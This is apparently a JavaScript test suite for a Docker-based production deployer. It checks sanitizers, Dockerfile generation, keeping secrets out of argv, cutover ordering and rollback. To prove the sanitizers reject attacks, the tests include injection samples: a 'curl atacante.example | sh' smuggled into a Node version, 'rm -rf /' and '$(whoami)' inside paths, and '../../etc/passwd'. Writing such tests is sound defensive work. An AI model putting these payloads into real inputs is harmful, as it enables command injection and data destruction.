const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const deployManagerSingleton = require('../server/services/deployManager');
const { DeployManager, helpers } = require('../server/services/deployManager');
const caddyManager = require('../server/services/caddyManager');

const { safeSlug, isValidEnvName, sanitizeHealthPath, sanitizeNodeMajor } = helpers;

/**
 * Pruebas del desplegador a producción.
 *
 * La mayor parte NO necesita Docker: la detección de stack, la generación del
 * Dockerfile, la construcción de los argv y —lo más importante— la máquina de
 * estados de promoción y rollback se prueban con el ejecutor de docker sustituido
 * por un doble. Solo el tramo final (construir e2e una imagen de verdad) exige un
 * daemon, y si no lo hay se salta igual que hace `tests/caddy.test.js`.
 *
 * Una instancia nueva de DeployManager con `saveStore` anulado no toca el disco,
 * así que las pruebas no ensucian data/deployments.json.
 */

let tmpRoot = null;

function fixture(name, files) {
  const dir = path.join(tmpRoot, name);
  for (const [relative, content] of Object.entries(files)) {
    const target = path.join(dir, relative);
    fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, content, 'utf8');
  }
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

/** Instancia aislada: sin disco y sin daemon. */
function sandbox() {
  const dm = new DeployManager();
  dm.store = {};
  dm.saveStore = () => {};
  dm.notify = () => {};
  // Sin esto cada prueba tardaría lo que tarda `docker --version` en fallar.
  dm.hasBinary = async () => false;
  dm.detectDocker = async () => ({ available: true, version: 'prueba', reason: null });
  return dm;
}

async function testDeploy() {
  console.log('🧪 Probando el desplegador a producción (deployManager)...');

  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-deploy-'));

  try {
    await testSanitizers();
    await testStrategyDetection();
    await testDockerfileGeneration();
    await testBuildArgvDiscipline();
    await testRunArgvSecrets();
    await testRouteSpecCompatibility();
    await testCutoverOrdering();
    await testFailedHealthLeavesOldVersionServing();
    await testRollback();
    await testBuildCacheGuardrails();
    await testRealDockerDeploy();
  } finally {
    try { fs.rmSync(tmpRoot, { recursive: true, force: true }); } catch (e) {}
  }

  console.log('✅ Desplegador a producción verificado\n');
}

// ---------------------------------------------------------------------------
// 1. Saneadores — la primera línea contra la inyección
// ---------------------------------------------------------------------------
async function testSanitizers() {
  assert.strictEqual(isValidEnvName('DATABASE_URL'), true);
  assert.strictEqual(isValidEnvName('_PRIVADO'), true);
  // Un nombre de variable SÍ viaja en argv: nada que parezca un flag pasa.
  assert.strictEqual(isValidEnvName('--privileged'), false);
  assert.strictEqual(isValidEnvName('-v'), false);
  assert.strictEqual(isValidEnvName('CON ESPACIO'), false);
  assert.strictEqual(isValidEnvName('1EMPIEZA_POR_DIGITO'), false);
  assert.strictEqual(isValidEnvName('CLAVE=VALOR'), false);

  assert.strictEqual(sanitizeHealthPath('/health'), '/health');
  assert.strictEqual(sanitizeHealthPath('/'), '/');
  assert.strictEqual(sanitizeHealthPath('/../../etc/passwd'), null);
  assert.strictEqual(sanitizeHealthPath('/x"; rm -rf /'), null);
  assert.strictEqual(sanitizeHealthPath('/con espacio'), null);
  assert.strictEqual(sanitizeHealthPath('/$(whoami)'), null);

  // Esto acaba dentro de una línea FROM de un Dockerfile generado.
  assert.strictEqual(sanitizeNodeMajor('>=22'), '22');
  assert.strictEqual(sanitizeNodeMajor('22.3.1'), '22');
  assert.strictEqual(sanitizeNodeMajor('alpine'), null);
  assert.strictEqual(sanitizeNodeMajor('999'), null);

  assert.strictEqual(safeSlug('proj_1789_ABC'), 'proj_1789_abc');
  assert.strictEqual(safeSlug('../../etc/passwd'), 'etc-passwd');
  assert.strictEqual(safeSlug(''), 'app');

  console.log('  ✓ Saneadores: nombres de variable, rutas de salud, versión de Node y slugs');
}

// ---------------------------------------------------------------------------
// 2. Detección de la estrategia de construcción
// ---------------------------------------------------------------------------
async function testStrategyDetection() {
  const dm = sandbox();

  const withDockerfile = fixture('con-dockerfile', {
    'Dockerfile': 'FROM node:22-alpine\nEXPOSE 7654\nCMD ["node", "index.js"]\n',
    'package.json': JSON.stringify({ name: 'x', dependencies: { next: '15.0.0' } })
  });
  const s1 = await dm.detectStrategy(withDockerfile, {});
  assert.strictEqual(s1.builder, 'dockerfile', 'Un Dockerfile del repositorio manda sobre la detección');
  assert.strictEqual(s1.containerPort, 7654, 'Debe leerse el EXPOSE del Dockerfile');
  assert.strictEqual(s1.injectHealthcheck, false, 'No se pisa el HEALTHCHECK de una imagen ajena');

  const nextApp = fixture('next-app', {
    'package.json': JSON.stringify({ dependencies: { next: '15.0.0' }, scripts: { build: 'next build', start: 'next start' } })
  });
  const s2 = await dm.detectStrategy(nextApp, {});
  assert.strictEqual(s2.builder, 'generated');
  assert.strictEqual(s2.stack, 'next');
  assert.strictEqual(s2.containerPort, 3000);

  const viteApp = fixture('vite-app', {
    'package.json': JSON.stringify({ devDependencies: { vite: '6.0.0' }, scripts: { build: 'vite build' } })
  });
  const s3 = await dm.detectStrategy(viteApp, {});
  assert.strictEqual(s3.stack, 'vite');
  assert.strictEqual(s3.containerPort, 80, 'Un SPA compilado se sirve por nginx en el 80');

  const nodeApp = fixture('node-app', {
    'package.json': JSON.stringify({ scripts: { start: 'node server.js' }, engines: { node: '>=20' } })
  });
  const s4 = await dm.detectStrategy(nodeApp, {});
  assert.strictEqual(s4.stack, 'node');
  assert.strictEqual(s4.nodeMajor, '20');

  const pyApp = fixture('py-app', { 'requirements.txt': 'flask\n', 'main.py': 'print(1)\n' });
  const s5 = await dm.detectStrategy(pyApp, {});
  assert.strictEqual(s5.stack, 'python');
  assert.strictEqual(s5.containerPort, 8000);

  const staticApp = fixture('static-app', { 'index.html': '<h1>hola</h1>' });
  const s6 = await dm.detectStrategy(staticApp, {});
  assert.strictEqual(s6.stack, 'static');

  const emptyApp = fixture('vacio', { 'LEEME.txt': 'nada' });
  const s7 = await dm.detectStrategy(emptyApp, {});
  assert.strictEqual(s7.stack, 'desconocido', 'Sin pistas, se dice que no se sabe en vez de adivinar');

  // El proyecto puede forzar puerto y ruta de salud.
  const s8 = await dm.detectStrategy(nodeApp, { containerPort: 4321, healthPath: '/salud' });
  assert.strictEqual(s8.containerPort, 4321);
  assert.strictEqual(s8.healthPath, '/salud');

  // Una ruta de salud maliciosa se descarta y se cae al valor por defecto.
  const s9 = await dm.detectStrategy(nodeApp, { healthPath: '/../../secreto' });
  assert.strictEqual(s9.healthPath, '/');

  console.log('  ✓ Detección: Dockerfile, Next, Vite, Node, Python, estático y «desconocido»');
}

// ---------------------------------------------------------------------------
// 3. Dockerfile generado
// ---------------------------------------------------------------------------
async function testDockerfileGeneration() {
  const dm = sandbox();

  const nodeDf = dm.generateDockerfile({ stack: 'node', containerPort: 3000, nodeMajor: '20', startCommand: 'start' });
  assert.ok(nodeDf.includes('FROM node:20-alpine'), 'Debe usar la versión de Node declarada');
  assert.ok(nodeDf.includes('USER culkibo'), 'No se ejecuta como root');
  assert.ok(nodeDf.includes('EXPOSE 3000'));
  assert.ok(nodeDf.includes('npm ci'), 'Con lockfile, npm ci: reproducible y más rápido');

  const viteDf = dm.generateDockerfile({ stack: 'vite', containerPort: 80, outputDir: 'dist' });
  assert.ok(viteDf.includes('FROM nginx:1.27-alpine'));
  assert.ok(viteDf.includes('try_files $uri $uri/ /index.html'), 'Un SPA necesita fallback a index.html');
  assert.ok(viteDf.includes('COPY --from=build /app/dist'));

  const pyDf = dm.generateDockerfile({ stack: 'python', containerPort: 8000, pythonEntry: 'app.py' });
  assert.ok(pyDf.includes('CMD ["python", "app.py"]'));

  // --- Inyección por package.json --------------------------------------
  // `engines.node` sale de un repositorio ajeno y se escribe en una línea FROM.
  const evil = dm.generateDockerfile({
    stack: 'node',
    containerPort: 3000,
    nodeMajor: sanitizeNodeMajor('22-alpine\nRUN curl http://atacante.example/x | sh'),
    startCommand: 'start'
  });
  assert.ok(!evil.includes('atacante.example'), 'La versión de Node no puede inyectar instrucciones');
  assert.ok(!evil.includes('curl'), 'Ninguna instrucción extra puede colarse en el Dockerfile');
  assert.ok(evil.includes('FROM node:22-alpine'), 'Se queda solo con el entero saneado');

  // Lo mismo con el directorio de salida y el entrypoint de Python.
  const evilOut = dm.generateDockerfile({ stack: 'vite', containerPort: 80, outputDir: '../../../etc' });
  assert.ok(!evilOut.includes('../../../etc'), 'El directorio de salida se descarta si no es un nombre simple');
  const evilPy = dm.generateDockerfile({ stack: 'python', containerPort: 8000, pythonEntry: 'x.py; rm -rf /' });
  assert.ok(evilPy.includes('CMD ["python", "main.py"]'), 'Un entrypoint sospechoso cae al valor por defecto');

  // El healthcheck solo se inyecta en imágenes propias, y sin metacaracteres.
  const cmd = dm.healthCommandFor({ stack: 'node', containerPort: 3000, healthPath: '/' });
  assert.ok(cmd.includes('http://127.0.0.1:3000/'));
  assert.ok(!/[;&|`$]/.test(cmd.replace(/\$\{?[a-z]/gi, '')), 'Sin metacaracteres de shell en el health-cmd');

  console.log('  ✓ Dockerfile generado: multi-etapa, usuario sin privilegios y a prueba de inyección');
}

// ---------------------------------------------------------------------------
// 4. Disciplina de caché de construcción — la regresión de Coolify #7040
// ---------------------------------------------------------------------------
async function testBuildArgvDiscipline() {
  const dm = sandbox();
  const input = { imageTag: 'culkibo/demo:b1', contextDir: '/srv/demo', dockerfile: 'Dockerfile' };

  const first = dm.buildArgs(input);
  await new Promise(r => setTimeout(r, 15));
  const second = dm.buildArgs(input);

  // ESTA es la prueba que impide repetir el fallo #7040 de Coolify: inyectar un
  // build arg que cambia en cada ejecución (una marca de tiempo, un nonce) hace
  // fallar la caché desde su primer uso y multiplica el tiempo de build por
  // cuatro. Si alguien añade uno, estas dos llamadas dejan de coincidir.
  assert.deepStrictEqual(first, second, 'buildArgs debe ser determinista: ningún argumento puede cambiar entre builds');

  const joined = first.join(' ');
  assert.ok(!/--build-arg/.test(joined), 'Culkibo no inyecta NINGÚN build arg por su cuenta');
  assert.ok(!/CACHEBUST|BUILD_ID|SOURCE_COMMIT|\d{13}/.test(joined), 'Ni marcas de tiempo ni nonces en los argumentos de build');
  assert.ok(first.includes('--progress=plain'), 'Salida en texto plano para poder transmitirla línea a línea');
  assert.strictEqual(first[first.length - 1], '/srv/demo', 'El contexto va al final');

  // Los build args del usuario se pasan POR NOMBRE, nunca con su valor.
  const withArgs = dm.buildArgs({ ...input, buildArgNames: ['NPM_TOKEN', '--privileged', 'API_URL'] });
  assert.ok(withArgs.includes('NPM_TOKEN'));
  assert.ok(withArgs.includes('API_URL'));
  assert.ok(!withArgs.includes('--privileged'), 'Un nombre que parece un flag se descarta');
  assert.ok(!withArgs.some(a => a.includes('=') && a.startsWith('NPM_TOKEN')), 'Nunca NOMBRE=valor');

  // Los constructores externos: argv documentado y sin secretos en railpack.
  const rp = dm.externalBuilderArgs('railpack', { imageTag: 'culkibo/demo:b1', contextDir: '/srv/demo', envNames: ['SECRETO'] });
  assert.deepStrictEqual(rp, ['build', '/srv/demo', '--name', 'culkibo/demo:b1', '--progress', 'plain']);
  assert.ok(!rp.includes('--env'), 'Railpack solo acepta CLAVE=VALOR, así que no recibe ninguna variable');

  const np = dm.externalBuilderArgs('nixpacks', { imageTag: 'culkibo/demo:b1', contextDir: '/srv/demo', envNames: ['SECRETO', 'mal nombre'] });
  assert.deepStrictEqual(np, ['build', '/srv/demo', '--name', 'culkibo/demo:b1', '--env', 'SECRETO']);
  assert.ok(!np.some(a => a.includes('=')), 'Nixpacks admite `--env NOMBRE`: el valor lo toma del entorno');

  console.log('  ✓ Caché de construcción: argv determinista, cero build args inyectados (regresión #7040)');
}

// ---------------------------------------------------------------------------
// 5. Los secretos no pasan por argv
// ---------------------------------------------------------------------------
async function testRunArgvSecrets() {
  const dm = sandbox();
  const args = dm.runArgs({
    containerName: 'culkibo_demo_b1',
    imageTag: 'culkibo/demo:b1',
    hostPort: 40123,
    containerPort: 3000,
    envNames: ['DATABASE_URL', 'STRIPE_SECRET_KEY', '--privileged', 'MAL NOMBRE'],
    healthCmd: 'node -e "fetch(\'http://127.0.0.1:3000/\')"'
  });
  const joined = args.join(' ');

  // Los nombres viajan; los valores jamás. `ps` no puede ver un secreto.
  assert.ok(args.includes('DATABASE_URL'));
  assert.ok(args.includes('STRIPE_SECRET_KEY'));
  assert.ok(!joined.includes('DATABASE_URL='), 'Un valor de entorno nunca aparece en argv');
  assert.ok(!args.includes('--privileged'), 'Un nombre de variable inválido se descarta antes de llegar a argv');
  assert.ok(!args.includes('MAL NOMBRE'));

  // Servicio de producción, no un proceso que casualmente está vivo.
  assert.ok(joined.includes('--restart unless-stopped'), 'Política de reinicio obligatoria');
  assert.ok(joined.includes('--memory 1024m'));
  assert.ok(joined.includes('--memory-swap 1024m'), 'Swap desactivado: OOM rápido y visible');
  assert.ok(joined.includes('--cpus 1.0'));
  assert.ok(joined.includes('--pids-limit'));
  assert.ok(joined.includes('--security-opt no-new-privileges'));
  assert.ok(joined.includes('--log-opt max-size=10m'), 'Los logs del contenedor no pueden llenar el disco');
  assert.ok(joined.includes('--health-cmd'));

  // El contenedor solo es alcanzable por el proxy y por la sonda del daemon.
  assert.ok(args.includes('127.0.0.1:40123:3000'), 'Se publica solo en loopback, nunca en 0.0.0.0');
  assert.strictEqual(args[args.length - 1], 'culkibo/demo:b1', 'La imagen va al final');

  // Ningún argumento se construye concatenando: cada uno es un elemento suelto.
  assert.ok(args.every(a => typeof a === 'string'), 'argv es un array de cadenas, no una línea de shell');

  console.log('  ✓ docker run: secretos fuera de argv, límites, reinicio y publicación en loopback');
}

// ---------------------------------------------------------------------------
// 6. La ruta que se le pide a Caddy es válida
// ---------------------------------------------------------------------------
async function testRouteSpecCompatibility() {
  const dm = sandbox();
  const hostnames = dm.hostnamesFor({
    domains: ['App.Ejemplo.COM', 'app.ejemplo.com', '  otro.ejemplo.com ', 'no es un dominio', '']
  });
  assert.deepStrictEqual(hostnames, ['app.ejemplo.com', 'otro.ejemplo.com'], 'Normaliza, deduplica y descarta basura');

  // `buildRoute` es puro: valida la forma sin hablar con ningún Caddy.
  const route = caddyManager.buildRoute({
    projectId: 'proj_demo',
    hostnames,
    upstreams: ['culkibo_demo_b1:3000']
  });
  assert.strictEqual(route['@id'], 'culkibo_proj_demo');
  assert.strictEqual(route.handle[0].handler, 'reverse_proxy');
  assert.strictEqual(route.handle[0].upstreams[0].dial, 'culkibo_demo_b1:3000');
  assert.strictEqual(route.terminal, true, 'Un proyecto no puede recibir tráfico de otro');
  assert.ok(route.handle[0].stream_close_delay > 0, 'El streaming sobrevive a la recarga de configuración');

  console.log('  ✓ La especificación de ruta es la que Caddy acepta (@id, terminal, stream_close_delay)');
}

// ---------------------------------------------------------------------------
// 7. Orden de la conmutación — construir, arrancar, VERIFICAR, conmutar, drenar
// ---------------------------------------------------------------------------
async function testCutoverOrdering() {
  const dm = sandbox();
  const trace = [];
  const contextDir = fixture('cutover', { 'index.html': '<h1>v2</h1>' });

  dm.detectStrategy = async () => ({
    builder: 'dockerfile', stack: 'dockerfile', dockerfile: 'Dockerfile',
    containerPort: 3000, healthPath: '/', injectHealthcheck: false, reason: 'prueba'
  });
  dm.runBuild = async () => { trace.push('construir'); return { ok: true }; };
  dm.ensureNetwork = async () => true;
  dm.findFreePort = async () => 45001;
  dm.resolveUpstream = async ({ containerName, containerPort }) => ({ dial: `${containerName}:${containerPort}`, mode: 'network' });
  dm.waitForHealth = async () => { trace.push('verificar'); return { healthy: true, attempts: 1, status: 200 }; };
  dm.switchRoute = async (dep) => { trace.push('conmutar'); dep.routeSwitched = true; return { ok: true }; };
  dm.runDocker = async (args) => {
    if (args[0] === 'run') trace.push('arrancar');
    if (args[0] === 'stop') trace.push('detener-viejo');
    if (args[0] === 'ps') return { code: 0, stdout: '', stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  };

  // Ya hay una versión sirviendo: es el caso que importa.
  dm.store['proj_orden'] = {
    current: {
      deploymentId: 'dep_viejo', imageTag: 'culkibo/orden:b0', containerName: 'culkibo_orden_b0',
      hostPort: 45000, containerPort: 3000, upstream: 'culkibo_orden_b0:3000',
      hostnames: ['orden.ejemplo.com'], healthPath: '/', version: 'b0'
    },
    previous: null,
    history: []
  };

  const project = { id: 'proj_orden', name: 'Orden', domains: ['orden.ejemplo.com'], envVars: {} };
  const result = await dm.deploy(project, { contextDir, drainTimeoutMs: 5, stopGraceSeconds: 0 });
  await dm.awaitDrain('proj_orden');

  assert.strictEqual(result.status, 'activo', `El despliegue debía terminar activo, fue ${result.status}: ${result.error}`);
  assert.deepStrictEqual(
    trace,
    ['construir', 'arrancar', 'verificar', 'conmutar', 'detener-viejo'],
    'El orden es innegociable: el viejo solo se detiene DESPUÉS de conmutar y drenar'
  );

  // El viejo pasa a ser el ancla de rollback; no se ha borrado.
  assert.strictEqual(dm.store['proj_orden'].current.containerName, result.containerName);
  assert.strictEqual(dm.store['proj_orden'].previous.containerName, 'culkibo_orden_b0');
  assert.ok(dm.store['proj_orden'].current.upstream.endsWith(':3000'));

  console.log('  ✓ Conmutación: construir → arrancar → verificar → conmutar → drenar → detener');
}

// ---------------------------------------------------------------------------
// 8. Si la versión nueva no está sana, NO se toca la ruta
//    (es el fallo #8627 de Coolify: 502/503 en actualizaciones rodantes)
// ---------------------------------------------------------------------------
async function testFailedHealthLeavesOldVersionServing() {
  const dm = sandbox();
  const contextDir = fixture('salud-fallida', { 'index.html': '<h1>roto</h1>' });
  let switchAttempted = false;
  const removed = [];

  dm.detectStrategy = async () => ({
    builder: 'dockerfile', stack: 'dockerfile', dockerfile: 'Dockerfile',
    containerPort: 3000, healthPath: '/', injectHealthcheck: false, reason: 'prueba'
  });
  dm.runBuild = async () => ({ ok: true });
  dm.ensureNetwork = async () => true;
  dm.findFreePort = async () => 45002;
  dm.waitForHealth = async () => ({ healthy: false, attempts: 30, reason: 'no respondió en 30 s' });
  dm.switchRoute = async () => { switchAttempted = true; return { ok: true }; };
  dm.runDocker = async (args) => {
    if (args[0] === 'rm') removed.push(args[args.length - 1]);
    return { code: 0, stdout: '', stderr: '' };
  };

  const serving = {
    deploymentId: 'dep_bueno', imageTag: 'culkibo/roto:b0', containerName: 'culkibo_roto_b0',
    hostPort: 45000, containerPort: 3000, upstream: 'culkibo_roto_b0:3000',
    hostnames: ['roto.ejemplo.com'], healthPath: '/', version: 'b0'
  };
  dm.store['proj_roto'] = { current: serving, previous: null, history: [] };

  const project = { id: 'proj_roto', name: 'Roto', domains: ['roto.ejemplo.com'], envVars: {} };
  const result = await dm.deploy(project, { contextDir });

  assert.strictEqual(result.status, 'fallido');
  assert.strictEqual(result.routeSwitched, false);
  assert.strictEqual(switchAttempted, false, 'Jamás se conmuta la ruta hacia algo que no ha respondido');
  assert.strictEqual(dm.store['proj_roto'].current, serving, 'La versión que funcionaba sigue siendo la actual');
  assert.ok(removed.includes(result.containerName), 'El contenedor fallido se retira, no se queda huérfano');

  console.log('  ✓ Salud fallida: la ruta no se toca y la versión anterior sigue sirviendo (evita #8627)');
}

// ---------------------------------------------------------------------------
// 9. Rollback
// ---------------------------------------------------------------------------
async function testRollback() {
  const previous = {
    deploymentId: 'dep_1', imageTag: 'culkibo/rb:b1', containerName: 'culkibo_rb_b1',
    hostPort: 45010, containerPort: 3000, upstream: 'culkibo_rb_b1:3000',
    hostnames: ['rb.ejemplo.com'], healthPath: '/', version: 'b1'
  };
  const current = {
    deploymentId: 'dep_2', imageTag: 'culkibo/rb:b2', containerName: 'culkibo_rb_b2',
    hostPort: 45011, containerPort: 3000, upstream: 'culkibo_rb_b2:3000',
    hostnames: ['rb.ejemplo.com'], healthPath: '/', version: 'b2'
  };

  // --- Sin versión anterior no hay nada que revertir ----------------------
  const empty = sandbox();
  empty.store['proj_vacio'] = { current, previous: null, history: [] };
  await assert.rejects(
    () => empty.rollback('proj_vacio'),
    /No hay ninguna versión anterior/,
    'Revertir sin ancla debe fallar con un mensaje claro, no silenciosamente'
  );

  // --- Camino rápido: el viejo sigue vivo dentro de su ventana de drenaje --
  const fast = sandbox();
  const fastCalls = [];
  fast.store['proj_rb'] = { current: { ...current }, previous: { ...previous }, history: [] };
  fast.switchRoute = async (rec, hosts, dial) => { fastCalls.push(`conmutar:${dial}`); rec.routeSwitched = true; return { ok: true }; };
  fast.runDocker = async (args) => {
    fastCalls.push(args[0]);
    if (args[0] === 'inspect') return { code: 0, stdout: 'true\n', stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  };

  const fastResult = await fast.rollback('proj_rb', { drainTimeoutMs: 5, stopGraceSeconds: 0 });
  await fast.awaitDrain('proj_rb');

  assert.strictEqual(fastResult.status, 'activo');
  assert.ok(!fastCalls.includes('start'), 'Si el viejo sigue vivo, revertir es SOLO un cambio de ruta');
  assert.ok(fastCalls.includes('conmutar:culkibo_rb_b1:3000'), 'La ruta vuelve al destino anterior');
  assert.strictEqual(fast.store['proj_rb'].current.containerName, 'culkibo_rb_b1');
  assert.strictEqual(fast.store['proj_rb'].previous.containerName, 'culkibo_rb_b2', 'Se intercambian: un segundo rollback vuelve hacia delante');

  // --- Camino lento: el viejo está parado -> arrancar, VERIFICAR, conmutar -
  const slow = sandbox();
  const slowTrace = [];
  slow.store['proj_rb2'] = { current: { ...current }, previous: { ...previous }, history: [] };
  slow.waitForHealth = async () => { slowTrace.push('verificar'); return { healthy: true, attempts: 2, status: 200 }; };
  slow.switchRoute = async (rec) => { slowTrace.push('conmutar'); rec.routeSwitched = true; return { ok: true }; };
  slow.runDocker = async (args) => {
    if (args[0] === 'inspect') return { code: 0, stdout: 'false\n', stderr: '' };
    if (args[0] === 'start') slowTrace.push('arrancar');
    return { code: 0, stdout: '', stderr: '' };
  };
  const slowResult = await slow.rollback('proj_rb2', { drainTimeoutMs: 5, stopGraceSeconds: 0 });
  await slow.awaitDrain('proj_rb2');

  assert.strictEqual(slowResult.status, 'activo');
  assert.deepStrictEqual(slowTrace, ['arrancar', 'verificar', 'conmutar'], 'Nunca se conmuta hacia algo que aún no responde');

  // --- Si la versión anterior tampoco arranca sana, no se conmuta ---------
  const broken = sandbox();
  let brokenSwitched = false;
  broken.store['proj_rb3'] = { current: { ...current }, previous: { ...previous }, history: [] };
  broken.waitForHealth = async () => ({ healthy: false, attempts: 30, reason: 'tampoco responde' });
  broken.switchRoute = async () => { brokenSwitched = true; return { ok: true }; };
  broken.runDocker = async (args) => {
    if (args[0] === 'inspect') return { code: 0, stdout: 'false\n', stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  };
  const brokenResult = await broken.rollback('proj_rb3', { drainTimeoutMs: 5 });
  assert.strictEqual(brokenResult.status, 'fallido');
  assert.strictEqual(brokenSwitched, false, 'Cambiar una versión mala por un 502 no es un rollback');
  assert.strictEqual(broken.store['proj_rb3'].current.containerName, 'culkibo_rb_b2', 'El estado no se toca si el rollback falla');

  // --- Si el contenedor anterior ya no existe, se dice ---------------------
  const gone = sandbox();
  gone.store['proj_rb4'] = { current: { ...current }, previous: { ...previous }, history: [] };
  gone.runDocker = async () => ({ code: 1, stdout: '', stderr: 'No such object' });
  const goneResult = await gone.rollback('proj_rb4');
  assert.strictEqual(goneResult.status, 'fallido');
  assert.ok(/ya no existe/.test(goneResult.error));

  console.log('  ✓ Rollback: camino rápido por ruta, camino lento con verificación, y fallos honestos');
}

// ---------------------------------------------------------------------------
// 10. Poda de la caché de BuildKit
// ---------------------------------------------------------------------------
async function testBuildCacheGuardrails() {
  const dm = sandbox();
  let received = null;
  dm.runDocker = async (args) => { received = args; return { code: 0, stdout: 'Total reclaimed space: 1.2GB', stderr: '' }; };

  const ok = await dm.pruneBuildCache({ keepStorageGb: 10 });
  assert.strictEqual(ok.ok, true);
  assert.deepStrictEqual(received, ['builder', 'prune', '--force', '--keep-storage', '10GB']);

  await dm.pruneBuildCache({ keepStorageGb: 5, untilHours: 72 });
  assert.ok(received.includes('--filter'));
  assert.ok(received.includes('until=72h'));

  // Nada de números que vengan del cuerpo de una petición sin validar.
  assert.strictEqual((await dm.pruneBuildCache({ keepStorageGb: 'diez' })).ok, false);
  assert.strictEqual((await dm.pruneBuildCache({ keepStorageGb: -1 })).ok, false);
  assert.strictEqual((await dm.pruneBuildCache({ keepStorageGb: 1, untilHours: 'ayer' })).ok, false);

  // La poda es MANUAL: ningún camino del despliegue la llama sola, porque eso
  // es destruirse la caché (Coolify #7040 por otra vía).
  const source = fs.readFileSync(path.join(__dirname, '..', 'server', 'services', 'deployManager.js'), 'utf8');
  const callSites = (source.match(/pruneBuildCache\(/g) || []).length;
  assert.strictEqual(callSites, 1, 'pruneBuildCache solo debe estar definida, nunca invocada desde el despliegue');

  console.log('  ✓ Poda de caché: argv correcto, entradas validadas y nunca automática');
}

// ---------------------------------------------------------------------------
// 11. Camino real, si hay un daemon de Docker
// ---------------------------------------------------------------------------
async function testRealDockerDeploy() {
  const docker = await deployManagerSingleton.detectDocker({ force: true });
  if (!docker.available) {
    console.log(`  ⏭  Despliegue real omitido: ${docker.reason}`);
    console.log('     Para ejecutarlo: arranca Docker y repite.');
    return;
  }
  console.log(`  ✓ Docker detectado (servidor ${docker.version}); ejecutando el despliegue real`);

  const dm = new DeployManager();
  dm.store = {};
  dm.saveStore = () => {};
  dm.notify = () => {};

  const projectId = `test_deploy_${Date.now().toString(36)}`;
  const contextDir = fixture('real', {
    'index.html': '<!doctype html><html lang="es"><head><meta charset="utf-8"><title>ok</title></head><body><h1>Culkibo</h1></body></html>'
  });

  // Sin dominios: se construye, se arranca y se verifica la salud, pero no se
  // toca el ingress. Así la prueba no depende de que haya un Caddy delante.
  const project = { id: projectId, name: 'Despliegue de prueba', domains: [], envVars: { CULKIBO_TEST: 'si' } };

  let deployment;
  try {
    deployment = await dm.deploy(project, {
      contextDir,
      healthTimeoutMs: 60000,
      buildTimeoutMs: 8 * 60 * 1000,
      drainTimeoutMs: 100,
      stopGraceSeconds: 1
    });

    assert.strictEqual(deployment.status, 'activo', `El despliegue real falló: ${deployment.error}`);
    assert.strictEqual(deployment.strategy.stack, 'static');
    assert.ok(deployment.containerName);
    console.log(`  ✓ Imagen construida y contenedor sano: ${deployment.imageTag}`);

    // El servicio responde de verdad en el puerto publicado.
    const res = await fetch(`http://127.0.0.1:${deployment.hostPort}/`, { signal: AbortSignal.timeout(5000) });
    assert.strictEqual(res.status, 200);
    assert.ok((await res.text()).includes('Culkibo'), 'El contenido servido es el del proyecto');
    console.log('  ✓ El contenedor sirve el contenido real por su puerto publicado');

    // El contenedor tiene política de reinicio y límites aplicados de verdad.
    const inspect = await dm.runDocker(
      ['inspect', '-f', '{{.HostConfig.RestartPolicy.Name}}|{{.HostConfig.Memory}}|{{.State.Running}}', deployment.containerName],
      { timeoutMs: 10000 }
    );
    const [policy, memory, running] = inspect.stdout.trim().split('|');
    assert.strictEqual(policy, 'unless-stopped', 'Debe ser un servicio durable, no un proceso suelto');
    assert.strictEqual(running, 'true');
    assert.ok(Number(memory) > 0, 'El límite de memoria debe estar aplicado');
    console.log(`  ✓ Servicio durable: restart=${policy}, memoria=${Math.round(Number(memory) / 1048576)} MB`);

    // Un segundo despliegue: cutover real con el primero todavía vivo.
    const second = await dm.deploy(project, {
      contextDir,
      healthTimeoutMs: 60000,
      buildTimeoutMs: 8 * 60 * 1000,
      drainTimeoutMs: 100,
      stopGraceSeconds: 1
    });
    assert.strictEqual(second.status, 'activo', `El segundo despliegue falló: ${second.error}`);
    assert.notStrictEqual(second.containerName, deployment.containerName);
    assert.strictEqual(dm.store[projectId].previous.containerName, deployment.containerName, 'El anterior queda como ancla de rollback');
    await dm.awaitDrain(projectId);
    console.log('  ✓ Segundo despliegue: cutover con drenaje y el anterior conservado');

    // Rollback real.
    const rolled = await dm.rollback(projectId, { healthTimeoutMs: 60000, drainTimeoutMs: 100, stopGraceSeconds: 1 });
    assert.strictEqual(rolled.status, 'activo', `El rollback real falló: ${rolled.error}`);
    assert.strictEqual(dm.store[projectId].current.containerName, deployment.containerName);
    await dm.awaitDrain(projectId);
    console.log('  ✓ Rollback real: vuelve a la versión anterior sin reconstruir');
  } finally {
    // Limpieza: contenedores por etiqueta e imágenes por nombre.
    try {
      const list = await dm.runDocker(['ps', '-aq', '--filter', `label=com.culkibo.project=${safeSlug(projectId)}`], { timeoutMs: 15000 });
      for (const id of (list.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        await dm.runDocker(['rm', '-f', id], { timeoutMs: 20000 });
      }
      const images = await dm.runDocker(['images', '-q', `culkibo/${safeSlug(projectId)}`], { timeoutMs: 15000 });
      for (const id of new Set((images.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean))) {
        await dm.runDocker(['rmi', '-f', id], { timeoutMs: 30000 });
      }
      console.log('  ✓ Recursos de la prueba eliminados');
    } catch (e) {
      console.warn(`  ⚠ Limpieza incompleta: ${e.message}`);
    }
  }
}

module.exports = testDeploy;

if (require.main === module) {
  testDeploy().catch(err => {
    console.error('❌ Fallo en las pruebas del desplegador:', err);
    process.exit(1);
  });
}
